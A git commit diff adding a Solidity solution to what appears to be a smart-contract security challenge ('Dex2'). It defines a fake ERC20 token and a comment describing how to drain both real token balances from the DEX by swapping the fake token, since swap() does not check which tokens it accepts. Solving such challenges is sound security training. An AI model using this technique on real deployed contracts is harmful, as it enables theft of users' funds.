8529a2d164d432d5c2801353ace6f2d903ec076c
Gakarot <startradingcentre@gmail.com>
2025-05-17 01:16:01 +0530

    Update Solution.sol

--- Challenge_24_Dex2/Solution.sol
+++ Challenge_24_Dex2/Solution.sol
@@ -1,1 +1,18 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";
+
+
+contract FakeToken is ERC20 {
+
+    constructor() ERC20("FakeTOken","$Fake") {
+        _mint(msg.sender, 1000 *10 **decimals());
+    }
+}
+/*
+Solution:
+We can exploit swap() as there is no check for token1 and token2 so we can make a fake token.
+And transfer and approve it to Dex2 address.
+Then we can swap token1 and token2 for our fake token making token1 and token2 balance zero.
+*/
